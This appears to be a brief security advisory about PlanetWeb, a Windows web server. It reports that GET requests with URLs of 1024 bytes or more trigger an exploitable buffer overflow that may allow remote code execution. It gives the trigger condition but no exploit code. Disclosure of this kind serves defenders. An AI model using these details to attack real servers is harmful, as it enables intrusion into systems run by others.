PlanetWeb is a commercially available web server distributed by PlanetDNS. It is available for the Microsoft Windows platform.

PlanetWeb is vulnerable to a buffer overflow condition when handling GET requests of excessive length. Upon receiving a GET request containing a 1024 byte or greater URL, an exploitable buffer overflow occurs.

This may result in the remote execution of arbitrary code within the context of the web server process.
